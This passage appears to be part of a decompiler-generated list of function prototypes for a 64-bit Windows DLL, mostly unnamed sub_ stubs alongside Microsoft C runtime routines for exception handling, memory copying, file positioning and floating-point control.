    "struct _IMAGE_RUNTIME_FUNCTION_ENTRY *__fastcall capture_current_context(PCONTEXT ContextRecord);",
    "struct _IMAGE_RUNTIME_FUNCTION_ENTRY *__fastcall capture_previous_context(PCONTEXT ContextRecord);",
    "__int64 sub_1800124E8();",
    "void sub_180012594();",
    "__int64 sub_1800125A4();",
    "_QWORD *sub_1800125B8();",
    "void *sub_1800125D4();",
    "LONG __fastcall sub_1800125E4(unsigned int a1);",
    "void sub_18001272C();",
    "void sub_180012768();",
    "_BOOL8 __uncaught_exception(void);",
    "__int64 __fastcall sub_1800127B0(unsigned int *a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180012804(unsigned int *a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180012858(__int64 a1, int a2);",
    "__int64 __fastcall sub_1800128BC(_BYTE *a1, __int64 a2, __int64 a3, int a4, char a5);",
    "bool __fastcall sub_1800129F4(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180012A28(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180012A8C(__int64 *a1, __int64 a2, __int64 a3);",
    "_QWORD *__fastcall sub_180012AC0(_QWORD *a1, ULONG64 *a2, __int64 a3, _QWORD *a4);",
    "_OWORD *__fastcall sub_180012BB4(_OWORD *a1, __int64 a2, int a3, __int64 a4, __int64 a5);",
    "_OWORD *__fastcall sub_180012CE8(_OWORD *a1, int *a2, int a3);",
    "void __fastcall sub_180012E54(",
    "        void **a1,",
    "        __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        int a7,",
    "        int a8,",
    "        int a9,",
    "        __int64 a10,",
    "        unsigned __int8 a11);",
    "void __fastcall sub_180012F58(",
    "        void **a1,",
    "        __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        int a8,",
    "        __int64 a9,",
    "        __int64 a10,",
    "        unsigned __int8 a11);",
    "__int64 __fastcall sub_180013078(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_18001323C(_QWORD *a1, __int64 a2);",
    "__int64 __fastcall sub_180013278(__int64 a1);",
    "__int64 sub_1800132CC();",
    "__int64 sub_1800132E0();",
    "__int64 __fastcall sub_1800132F4(__int64 a1);",
    "__int64 __fastcall sub_18001330C(__int64 a1);",
    "__int64 __fastcall _CxxFrameHandler3(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall _CxxFrameHandler4(__int64 a1, __int64 a2, int a3, __int64 a4);",
    "void __fastcall sub_18001346C(__int64 a1);",
    "__int64 __fastcall sub_1800134E0(__int64 a1);",
    "__int64 __fastcall sub_180013534(__int64 a1);",
    "void  sub_18001359C();",
    "__int64 __fastcall sub_1800135A8(__int64 *a1, __int64 a2);",
    "__int64 __fastcall sub_180013638(__int64 a1);",
    "void  sub_18001366C();",
    "void __stdcall  CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);",
    "bool sub_180013730();",
    "EXCEPTION_DISPOSITION __cdecl _C_specific_handler(",
    "        struct #70 *ExceptionRecord,",
    "        void *EstablisherFrame,",
    "        struct #55 *ContextRecord,",
    "        struct _DISPATCHER_CONTEXT *DispatcherContext);",
    "char sub_180013968();",
    "bool __fastcall Concurrency::details::ScheduleGroupSegmentBase::HasUnrealizedChores(#96 *this);",
    "char sub_1800139A4();",
    "char __fastcall sub_1800139B4(char a1);",
    "char sub_1800139D0();",
    "PSLIST_ENTRY __fastcall sub_180013A08(union _SLIST_HEADER *a1);",
    "void *__fastcall sub_180013A34(void *a1);",
    "void sub_180013A54();",
    "__int64 __fastcall sub_180013A9C(__int64 a1);",
    "__int64 sub_180013AB8();",
    "__int64 sub_180013B78();",
    "char sub_180013BC8();",
    "char sub_180013C10();",
    "__int64 __fastcall sub_180013C34(_QWORD *a1, _QWORD *a2, __int64 a3);",
    "__int64 __fastcall __GetUnwindTryBlock(",
    "        unsigned __int64 *a1,",
    "        struct _xDISPATCHER_CONTEXT *a2,",
    "        const struct _s_FuncInfo *a3);",
    "__int64 __fastcall sub_180013C94(_QWORD *a1, ULONG64 *a2, __int64 a3, int a4);",
    "__int64 __fastcall sub_180013CD0(__int64 a1, _QWORD *a2);",
    "__int64 __fastcall sub_180013CE0(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180013D48(__int64 a1, __int64 a2, unsigned __int64 a3);",
    "__int64 __fastcall sub_180013E38(__int64 a1, __int64 *a2, int *a3, __int64 a4);",
    "__int64 __fastcall sub_180014038(__int64 a1, __int64 *a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_18001423C(__int64 a1, __int64 *a2, int *a3, __int64 a4);",
    "__int64 __fastcall sub_1800142FC(__int64 a1, __int64 *a2, __int64 a3, __int64 a4);",
    "void __fastcall sub_1800143C0(",
    "        __int64 a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        ULONG64 *a4,",
    "        __int64 a5,",
    "        int *a6,",
    "        __int64 a7,",
    "        int *a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        unsigned __int8 a12);",
    "void __fastcall sub_180014494(",
    "        __int64 a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        __int64 a7,",
    "        int *a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        unsigned __int8 a12);",
    "__int64 __fastcall sub_180014568(",
    "        __int64 a1,",
    "        unsigned __int64 *a2,",
    "        __int64 a3,",
    "        struct _xDISPATCHER_CONTEXT *a4,",
    "        struct _s_FuncInfo *a5,",
    "        unsigned __int8 a6,",
    "        int a7,",
    "        __int64 a8);",
    "__int64 __fastcall sub_180014A38(",
    "        __int64 a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        unsigned __int8 a6,",
    "        int a7,",
    "        __int64 a8);",
    "void __fastcall sub_180014F3C(",
    "        unsigned int *a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        ULONG64 *a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        __int64 a8);",
    "__int64 __fastcall sub_1800151AC(",
    "        unsigned int *a1,",
    "        void **a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        __int64 a8);",
    "__int64 __fastcall sub_1800154A0(__int64 a1, __int64 a2, _BYTE *a3);",
    "__int64 __fastcall sub_1800155E0(__int64 a1, __int64 a2, _BYTE *a3);",
    "__int64 __fastcall sub_18001572C(",
    "        __int64 a1,",
    "        unsigned __int64 *a2,",
    "        __int64 a3,",
    "        struct _xDISPATCHER_CONTEXT *a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8);",
    "__int64 __fastcall sub_180015964(",
    "        __int64 a1,",
    "        __int64 *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8);",
    "// attributes: thunk",
    "__int64 __fastcall sub_180015BF8(",
    "        __int64 a1,",
    "        unsigned __int64 *a2,",
    "        __int64 a3,",
    "        struct _xDISPATCHER_CONTEXT *a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8);",
    "__int64 __fastcall sub_180015C00(",
    "        __int64 a1,",
    "        __int64 *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        __int64 a7,",
    "        unsigned __int8 a8);",
    "__int64 __fastcall sub_180015C4C(__int64 a1, __int64 a2, __int64 a3, int a4);",
    "__int64 __fastcall sub_180015CD0(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180015DB4(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_180015DF0(_QWORD *a1);",
    "__int64 __fastcall sub_180015E10(_QWORD *a1);",
    "__int64 __fastcall sub_180015FFC(__int64 a1);",
    "char __fastcall sub_18001624C(__int64 a1);",
    "__int64 __fastcall sub_1800163E0(__int64 *a1, __int64 a2, _DWORD *a3);",
    "__int64 __fastcall sub_180016464(__int64 *a1, __int64 a2, int a3, _DWORD *a4);",
    "__int64 __fastcall sub_180016494(_QWORD *a1, _QWORD *a2, __int64 a3, int a4);",
    "__int64 __fastcall sub_180016620(_QWORD *a1, __int64 a2, __int64 a3, int a4);",
    "__int64 __fastcall sub_180016928(unsigned __int64 *a1, struct _xDISPATCHER_CONTEXT *a2, struct _s_FuncInfo *a3);",
    "char __fastcall sub_1800169C0(__int64 a1, _DWORD *a2, __int64 a3, __int64 a4);",
    "char __fastcall sub_180016AB0(int *a1);",
    "__int64 __fastcall sub_180016B38(_DWORD *a1, __int64 *a2);",
    "__int64 __fastcall sub_180016BD4(__int64 a1, __int64 (__fastcall *a2)(__int64, __int64), __int64 a3);",
    "__int64 __fastcall sub_180016BE0(",
    "        __int64 a1,",
    "        __int64 (__fastcall *a2)(__int64, __int64, _QWORD),",
    "        __int64 a3,",
    "        unsigned int a4);",
    "__int64 __fastcall sub_180016BF0(__int64 a1, int a2, int a3, __int64 a4, __int64 a5);",
    "__int64 __fastcall sub_180016CC0(__int128 *a1, unsigned int a2, __int64 a3, unsigned int a4, __int128 *a5);",
    "__int64 __fastcall sub_180016DA0(__int64 a1, __int64 a2, __int64 a3);",
    "void nullsub_2();",
    "void nullsub_1();",
    "struct _TEB *__fastcall sub_180016DD4(__int64 a1);",
    "char sub_180016E0C();",
    "char sub_180016E54();",
    "FARPROC __fastcall sub_180016E8C(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4);",
    "DWORD __fastcall sub_180016FDC(__int64 a1);",
    "int __fastcall sub_180017024(DWORD a1);",
    "LPVOID __fastcall sub_18001706C(DWORD a1);",
    "int __fastcall sub_1800170B4(PCONTEXT dwTlsIndex, XSAVE_FORMAT *lpTlsValue);",
    "int __fastcall sub_180017108(LPCRITICAL_SECTION lpCriticalSection, PCONTEXT dwSpinCount, unsigned int a3);",
    "__int64 __fastcall CallSettingFrame(__int64 a1, __int64 *a2, __int64 a3);",
    "void __fastcall CallSettingFrame_0(__int64 a1, __int64 *a2, __int64 a3);",
    "__int64 __fastcall sub_180017220(__int64 a1, __int64 *a2);",
    "__int64 __fastcall sub_180017250(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);",
    "__int64 sub_180017298();",
    "char *__fastcall sub_1800173B8(unsigned int a1);",
    "__int64 sub_1800173CC();",
    "__int64 __fastcall sub_180017428(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4);",
    "__m128 __fastcall sub_180017488(__int64 a1, _DWORD *a2);",
    "__int64 __fastcall sub_180017580(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4);",
    "__int64 __fastcall sub_1800175C0(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, __int64 a6);",
    "char __fastcall sub_180017770(__int64 a1, unsigned __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180017818(__int64 a1, char **a2, unsigned int a3, unsigned __int8 a4);",
    "char __fastcall sub_180017ACC(__int64 a1, char a2);",
    "char __fastcall sub_180017CD0(__int64 a1, char a2);",
    "char __fastcall sub_180017ED4(__int64 a1, char a2);",
    "_BYTE *__fastcall sub_1800180D8(__int64 a1, unsigned int a2);",
    "_BYTE *__fastcall sub_180018148(__int64 a1, unsigned int a2, char a3);",
    "_BYTE *__fastcall sub_1800181F4(__int64 a1, unsigned int a2, char a3);",
    "_BYTE *__fastcall sub_180018278(__int64 a1, unsigned __int64 a2);",
    "_BYTE *__fastcall sub_1800182E8(__int64 a1, unsigned __int64 a2, char a3);",
    "_BYTE *__fastcall sub_180018398(__int64 a1, unsigned __int64 a2, char a3);",
    "__int64 __fastcall sub_18001841C(__int64 **a1);",
    "__int64 __fastcall sub_1800185B0(__int64 a1);",
    "char __fastcall sub_180018618(__int64 a1, _DWORD *a2);",
    "__int64 __fastcall sub_1800186A8(__int64 a1);",
    "__int64 __fastcall sub_180018A40(__int64 a1);",
    "char __fastcall sub_180018DC4(__int64 a1);",
    "char __fastcall sub_180018F4C(__int64 a1);",
    "char __fastcall sub_1800190D4(__int64 a1);",
    "char __fastcall sub_18001950C(__int64 a1);",
    "char __fastcall sub_180019910(__int64 a1);",
    "char __fastcall sub_18001998C(__int64 a1);",
    "char __fastcall sub_180019BE0(__int64 a1);",
    "char __fastcall sub_180019CB4(__int64 a1);",
    "char __fastcall sub_180019D6C(__int64 a1);",
    "__int64 __fastcall sub_180019E10(__int64 a1);",
    "char __fastcall sub_180019E88(__int64 a1);",
    "void __fastcall sub_180019F24(__int64 a1, __int64 a2, int a3, _DWORD *a4);",
    "void __fastcall sub_180019FC8(_QWORD *a1, char *a2, int a3, _DWORD *a4, __int64 a5);",
    "__int64 __fastcall sub_18001A094(__int64 a1, __int64 a2, __int64 a3, __int128 *a4, __int64 a5);",
    "__int64 __fastcall sub_18001A1B8(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int128 *a5, __int64 a6);",
    "__int64 __fastcall sub_18001A2CC(XSAVE_FORMAT *a1);",
    "__int64 __fastcall sub_18001A2E0(__int64 a1);",
    "__int64 __fastcall sub_18001A34C(__int64 a1, __int64 a2);",
    "LONG __fastcall sub_18001A398(__int64 a1, int a2, int a3);",
    "__int64 __fastcall sub_18001A4FC(int a1, int a2, int a3, int a4, __int64 a5);",
    "__int64 __fastcall sub_18001A598(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, __int64 a6);",
    "void __cdecl invalid_parameter_noinfo();",
    "void __cdecl  invalid_parameter_noinfo_noreturn();",
    "BOOL sub_18001A6B4();",
    "__int64 sub_18001A6FC();",
    "// attributes: thunk",
    "__int64 __fastcall sub_18001A730(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18001A780(unsigned int a1);",
    "__int64 __fastcall sub_18001A7C8(__int64 a1, __int64 a2);",
    "void *sub_18001A7EC();",
    "void *sub_18001A80C();",
    "void __fastcall sub_18001A82C(__int64 a1, _QWORD *a2, __int64 a3);",
    "void __fastcall sub_18001A8D4(__int64 a1, _QWORD *a2, __int64 a3);",
    "__int64 __fastcall sub_18001A97C(__int64 a1, _QWORD *a2, __int64 a3);",
    "__int64 __fastcall sub_18001AA1C(__int64 a1, _QWORD *a2, __int64 a3);",
    "__int64 __fastcall sub_18001AABC(__int64 *a1, char **a2, __int64 a3);",
    "__int64 __fastcall sub_18001AF64(char *a1, _QWORD *a2, _BYTE *a3);",
    "__int64 __fastcall sub_18001B0A8(unsigned __int8 *a1, char **a2, char *a3);",
    "char __fastcall sub_18001B294(_BYTE *a1, _QWORD *a2);",
    "char __fastcall sub_18001B2DC(_BYTE *a1, _QWORD *a2);",
    "__int64 __fastcall sub_18001B324(int a1, __int64 a2, unsigned int *a3);",
    "__int64 __fastcall sub_18001B494(int a1, __int64 a2, unsigned __int64 *a3);",
    "_BYTE *__fastcall sub_18001B674(_BYTE *a1, __int128 *a2);",
    "__int64 __fastcall sub_18001B710(_BYTE *a1);",
    "__int64 __fastcall sub_18001B74C(_BYTE *a1);",
    "__int64 __fastcall sub_18001B788(unsigned __int64 a1, int a2, unsigned __int8 a3, char a4, __int64 a5);",
    "__int64 __fastcall sub_18001BB34(_DWORD *a1, unsigned int a2, unsigned __int8 a3, char a4, __int64 a5);",
    "__int64 __fastcall sub_18001BC94(__int64 a1, _BYTE *a2);",
    "__int64 __fastcall sub_18001DB14(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18001DBC0(char *a1, unsigned int *a2);",
    "__int64 __fastcall sub_18001E05C(__int64 a1, __int64 a2, __int64 *a3);",
    "errno_t __cdecl memcpy_s(",
    "        void *const Destination,",
    "        const rsize_t DestinationSize,",
    "        const void *const Source,",
    "        const rsize_t SourceSize);",
    "void __fastcall sub_18001E15C(__int64 a1, _QWORD *a2);",
    "void __fastcall sub_18001E164(__int64 a1, _QWORD *a2);",
    "__int64 __fastcall sub_18001E16C(unsigned __int8 **a1);",
    "__int64 __fastcall sub_18001E1B0(__int64 a1);",
    "__int64 __fastcall sub_18001E2C4(unsigned int a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_18001E42C(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_18001E444(unsigned int a1, __int64 a2);",
    "__int64 __fastcall sub_18001E4DC(int a1, __int64 *a2);",
    "__int64 __fastcall sub_18001E5FC(int a1, __int64 *a2);",
    "__int64 __fastcall sub_18001E654(__int64 a1, unsigned __int8 **a2, unsigned int a3, unsigned __int8 a4);",
    "__int64 __fastcall sub_18001E944(__int64 a1, __int16 **a2, unsigned int a3, unsigned __int8 a4);",
    "__int64 __fastcall sub_18001F0E0(unsigned __int8 *a1, unsigned __int8 *a2, unsigned int a3);",
    "__int64 sub_18001F194();",
    "__int64 __fastcall sub_18001F1C0(__int64 a1, _QWORD *a2, __int64 **a3, _QWORD *a4);",
    "__int64 __fastcall sub_18001F25C(__int64 a1, unsigned int *a2, __int64 **a3, unsigned int *a4);",
    "__int64 __fastcall sub_18001F340(__int64 a1, _QWORD *a2, _QWORD **a3, _QWORD *a4);",
    "__int64 __fastcall sub_18001F380(char a1);",
    "__int64 __fastcall sub_18001F3E0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18001F46C(__int64 a1);",
    "__int64 sub_18001F540();",
    "__int64 __fastcall sub_18001F548(__int64 a1);",
    "__int64 __fastcall sub_18001F5B0(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4);",
    "__int64 __fastcall sub_18001F5F0(__int64 a1);",
    "__int64 __fastcall sub_18001F6D8(__int64 a1, __int64 a2, int a3, __int64 a4);",
    "int __cdecl fsetpos(FILE *Stream, const fpos_t *Position);",
    "__int64 __fastcall sub_18001F848(__int64 a1, __int64 a2, unsigned int a3, __int64 a4);",
    "char __fastcall sub_18001F8E4(__int64 a1, signed __int64 a2, int a3);",
    "__int64 __fastcall sub_18001F9CC(__int64 a1, signed __int64 a2, int a3, __int64 a4);",
    "__int64 __fastcall sub_18001FAB8(__int64 a1, __int64 a2, unsigned int a3);",
    "__int64 __fastcall sub_18001FB50(__int64 a1, int a2, unsigned int a3);",
    "int __cdecl fgetpos(FILE *Stream, #87 *Position);",
    "__int64 __fastcall sub_18001FC38(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4);",
    "__int64 __fastcall sub_18001FC78(__int64 **a1);",
    "__int64 __fastcall sub_18001FCF8(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);",
    "unsigned __int64 __fastcall sub_18001FD94(char *a1, unsigned __int64 a2, unsigned __int64 a3, __int64 a4, __int64 a5);",
    "__int64 __fastcall sub_18001FFA8(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "unsigned __int64 __fastcall sub_18002004C(",
    "        _BYTE *a1,",
    "        unsigned __int64 a2,",
    "        unsigned __int64 a3,",
    "        unsigned __int64 a4,",
    "        __int64 *a5);",
    "__int64 __fastcall sub_1800202AC(int a1, int a2, int a3, __int64 a4);",
    "unsigned __int64 __fastcall sub_1800202CC(",
    "        _BYTE *a1,",
    "        unsigned __int64 a2,",
    "        unsigned __int64 a3,",
    "        unsigned __int64 a4,",
    "        __int64 *a5);",
    "__int64 __fastcall sub_180020374(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_1800203F0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180020498(__int64 a1);",
    "__int64 __fastcall sub_180020530(_BYTE *a1, unsigned __int8 *a2);",
    "__int64 __fastcall sub_1800205D0(char *a1, unsigned __int8 *a2);",
    "char sub_1800209A0();",
    "void __fastcall sub_1800209E8(int a1);",
    "char sub_180020A04();",
    "void __fastcall sub_180020A3C(int a1);",
    "void sub_180020A58();",
    "// attributes: thunk",
    "__int64 __fastcall sub_180020A84(__int64 a1);",
    "__int64 __fastcall sub_180020A8C(__int64 a1, int *a2, __int64 a3, int *a4);",
    "__int64 __fastcall sub_180020ACC(unsigned int **a1);",
    "__int64 __fastcall sub_180020D68(int a1, __int64 a2);",
    "__int64 sub_180020DB4();",
    "__int64 __fastcall sub_180020DF0(int a1);",
    "__int64 __fastcall sub_180020EA0(int a1);",
    "__int64 __fastcall sub_180020F50(int a1);",
    "__int64 sub_180020FF8();",
    "__int64 sub_180021028();",
    "__int64 sub_18002105C();",
    "__int64 __fastcall sub_18002108C(__int64 a1);",
    "__int64 __fastcall sub_1800216F0(__int64 a1);",
    "__int64 __fastcall sub_180021774(_BYTE *a1, _BYTE *a2, unsigned int a3);",
    "// attributes: thunk",
    "__int64 __fastcall sub_180021830(_BYTE *a1, _BYTE *a2, unsigned int a3);",
    "__int64 __fastcall sub_180021838(unsigned int a1, __int128 *a2);",
    "__int64 __fastcall sub_18002196C(unsigned int a1);",
    "// Microsoft VisualC v7/14 64bit runtime",
    "__int64 __fastcall unknown_libname_3(double a1);",
    "void  sub_1800219B0();",
    "__int64 __fastcall sub_180021A08(_BYTE *a1, __int64 a2);",
    "__int64 __fastcall sub_180021A20(_BYTE *a1, __int64 a2, __int64 a3, unsigned int a4);",
    "__int64 __fastcall sub_180021B9C(_WORD *a1, __int64 a2, __int64 a3, int a4);",
    "char *__fastcall sub_180021CB8(__m128i *a1, unsigned __int64 a2);",
    "__int64 __fastcall sub_180021E08(__m128i *a1, unsigned __int64 a2);",
    "unsigned int (__fastcall *__fastcall sub_180021FE8(__int64 a1))(__int64);",
    "__int64 sub_180022028();",
    "void __fastcall sub_180022060(void (**a1)(void), void (**a2)(void));",
    "__int64 __fastcall sub_1800220A4(__int64 (**a1)(void), __int64 (**a2)(void));",
    "__int64 __fastcall sub_180022100(int a1, __int64 a2);",
    "void __fastcall sub_180022284(__int64 a1, int *a2, __int64 a3, int *a4);",
    "int *__fastcall sub_1800222BC(int **a1);",
    "void __fastcall sub_180022388(UINT a1, int a2, int a3);",
    "void __fastcall  sub_180022450(UINT uExitCode);",
    "bool sub_180022484();",
    "int __fastcall sub_1800224A8(unsigned int a1);",
    "void __cdecl cexit();",
    "void __fastcall sub_180022530(UINT a1);",
    "__int64 sub_18002253C();",
    "char __fastcall sub_180022544(char *a1, char **a2, char *a3, _QWORD *a4, _QWORD *a5);",
    "__int64 __fastcall sub_18002270C(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3);",
    "__int64 __fastcall sub_18002276C(int a1);",
    "__int64 sub_1800228F4();",
    "__int64 __fastcall sub_180022968(char *a1);",
    "void __fastcall sub_180022A78(XSAVE_FORMAT *a1);",
    "void __fastcall sub_180022ABC(XSAVE_FORMAT **a1);",
    "void __fastcall sub_180022AD8(XSAVE_FORMAT **a1);",
    "void sub_180022AF4();",
    "// attributes: thunk",
    "__int64 sub_180022B38(void);",
    "__int64 __fastcall sub_180022B40(__int64 a1, int *a2, __int64 a3, int *a4);",
    "__int64 __fastcall sub_180022B7C(__int64 a1, int *a2, __int64 a3, int *a4);",
    "__int64 __fastcall sub_180022BB8(_QWORD **a1);",
    "__int64 __fastcall sub_180022D68(_QWORD **a1);",
    "__int64 __fastcall sub_180022E88(__int64 a1);",
    "__int64 __fastcall sub_180022E98(__int64 a1);",
    "__int64 __fastcall sub_180022EDC(uintptr_t *a1);",
    "__int64 __fastcall sub_180022F04(__int64 a1, __int64 a2);",
    "char sub_180022F60();",
    "char sub_180022F84();",
    "char sub_180022F94();",
    "char sub_180022FDC();",
    "char sub_18002301C();",
    "__int64 sub_180023078();",
    "bool __fastcall Concurrency::details::ScheduleGroupSegmentBase::HasUnrealizedChores(#96 *this);",
    "char sub_1800230A0();",
    "char __fastcall sub_1800230B0(char a1);",
    "char sub_1800230E8();",
    "void  sub_1800230F8();",
    "__int64 __fastcall sub_180023124(_BYTE *a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180023184(__int16 *a1);",
    "__int64 __fastcall sub_1800232D0(_WORD *a1, _WORD *a2, __int64 a3);",
    "LPVOID __fastcall sub_1800232FC(unsigned __int64 a1, unsigned __int64 a2);",
    "void __fastcall sub_180023374(XSAVE_FORMAT *lpMem);",
    "__int64 __fastcall sub_1800233E8(__int64 a1, int *a2, _QWORD **a3, int *a4);",
    "FARPROC __fastcall sub_180023464(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4);",
    "__int64 __fastcall sub_180023620(__int64 a1);",
    "__int64 sub_180023678();",
    "__int64 __fastcall sub_1800236BC(__int64 a1, unsigned int a2, __int64 a3, __int64 a4);",
    "int __fastcall sub_18002377C(__int64 a1, LCTYPE a2, WCHAR *a3, unsigned int a4);",
    "__int64 __fastcall sub_18002380C(__int64 a1, unsigned int a2);",
    "int __fastcall sub_180023878(LPCRITICAL_SECTION lpCriticalSection, PCONTEXT dwSpinCount, unsigned int a3);",
    "int __fastcall sub_1800238E8(__int64 a1);",
    "__int64 __fastcall sub_18002394C(unsigned int a1, __int64 a2, unsigned int a3, unsigned int a4);",
    "int __fastcall sub_1800239D0(",
    "        __int64 a1,",
    "        DWORD a2,",
    "        const WCHAR *a3,",
    "        unsigned int a4,",
    "        WCHAR *lpDestStr,",
    "        int cchDest,",
    "        __int64 a7,",
    "        __int64 a8,",
    "        __int64 a9);",
    "__int64 __fastcall sub_180023ABC(__int64 a1, unsigned int a2);",
    "bool sub_180023B1C();",
    "FARPROC sub_180023B4C();",
    "char sub_180023CA8();",
    "char __fastcall sub_180023CCC(char a1);",
    "__int64 sub_180023D10();",
    "__int64 __fastcall sub_180023DC4(__int64 a1);",
    "void sub_180023E08();",
    "__int64 sub_180023EF8();",
    "char sub_180024000();",
    "char sub_18002403C();",
    "double __fastcall sub_1800240C0(__int64 a1, int a2, double a3, double a4, __int64 a5);",
    "__int64 __fastcall sub_1800241B4(unsigned int a1, double *a2, __int16 a3);",
    "__int64 __fastcall raise_exc(int a1, int a2, int a3, int a4, __int64 a5, __int64 a6);",
    "__int64 __fastcall sub_1800244D0(ULONG_PTR a1, _QWORD *a2, char a3, __int16 a4, _DWORD *a5, _DWORD *a6, int a7);",
    "void __fastcall sub_1800247D8(int a1);",
    "double __fastcall sub_180024808(int a1, int a2, double a3, double a4, double a5, __int64 a6);",
    "void __fastcall sub_1800248D8(double a1, int *a2);",
    "__int64 __fastcall sub_180024A08(double a1);",
    "__int64 clrfp();",
    "__int64 __fastcall ctrlfp(int a1, int a2);",
    "__int64 __fastcall set_statfp(char a1);",
    "__int64 statfp();",
    "LPVOID __fastcall sub_180024B50(unsigned __int64 a1);",
    "__int64 __fastcall sub_180024BB0(__int64 a1, __int64 *a2);",
    "__int64 __fastcall sub_180024BE4(__int64 a1, __int64 *a2, __int64 a3);",
    "__int64 __fastcall sub_180024C1C(__int64 a1, __int64 *a2);",
    "__int64 __fastcall sub_180024C50(__int64 a1, __int64 *a2, __int64 a3);",
    "__int64 __fastcall sub_180024C88(",
    "        __int64 *a1,",
    "        __int64 a2,",
    "        unsigned __int64 a3,",
    "        int a4,",
    "        __int64 a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        unsigned int a9,",
    "        __int64 a10);",
    "__int64 __fastcall sub_180025020(",
    "        _QWORD *a1,",
    "        _BYTE *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __int64 a10);",
    "__int64 __fastcall sub_18002511C(",
    "        _BYTE *a1,",
    "        unsigned __int64 a2,",
    "        int a3,",
    "        char a4,",
    "        int a5,",
    "        __int64 a6,",
    "        unsigned __int8 a7,",
    "        __int64 a8);",
    "__int64 __fastcall sub_180025300(",
    "        __int64 *a1,",
    "        _BYTE *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        __int64 a8);",
    "__int64 __fastcall sub_1800253D8(_BYTE *a1, __int64 a2, int a3, __int64 a4, char a5, __int64 a6);",
    "__int64 __fastcall sub_180025530(",
    "        __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __int64 a10);",
    "char __fastcall sub_180025684(unsigned __int64 *a1, __int64 a2, __int16 a3, int a4);",
    "__int64 __fastcall sub_18002579C(",
    "        __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        unsigned __int64 a8,",
    "        int a9,",
    "        __int64 a10);",
    "__int64 __fastcall sub_180025A84(int *a1, _BYTE *a2, unsigned __int64 a3, unsigned __int16 a4, __int64 a5);",
    "__int64 __fastcall sub_180025C34(_WORD *a1, unsigned __int8 *a2, unsigned __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180025DAC(__int64 a1);",
    "int __cdecl get_printf_count_output();",
    "bool __fastcall sub_180025DEC(char *a1);",
    "char __fastcall sub_180025E38(__int64 a1);",
    "__int64 __fastcall sub_180025F00(char a1, __int64 a2, __int64 a3);",
    "void __fastcall sub_180025F40(__int64 a1, int *a2, __int64 a3, int *a4);",
    "void __fastcall sub_180025F80(__int64 a1, int *a2, _QWORD **a3, int *a4);",
    "void __fastcall sub_180025FC0(__int64 a1, int *a2, __int64 a3, int *a4);",
    "void __fastcall sub_180026008(__int64 a1, int *a2, __int64 a3, int *a4);",
    "void __fastcall sub_180026068(__int64 a1);",
    "void __fastcall Concurrency::details::SchedulerProxy::DeleteThis(XSAVE_FORMAT *lpFlsData);",
